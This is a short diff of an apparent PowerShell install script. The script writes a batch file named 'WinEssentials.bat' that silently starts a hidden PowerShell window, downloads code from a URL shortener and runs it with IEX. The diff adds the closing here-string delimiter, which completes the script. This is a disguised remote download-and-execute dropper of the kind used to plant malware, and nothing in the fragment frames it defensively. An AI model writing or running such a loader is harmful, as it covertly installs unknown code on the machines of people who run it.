@@ -24,6 +24,7 @@ New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
 start powershell.exe -windowstyle hidden -command IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
 
 exit
+"@
 }
 
 Install -sting test
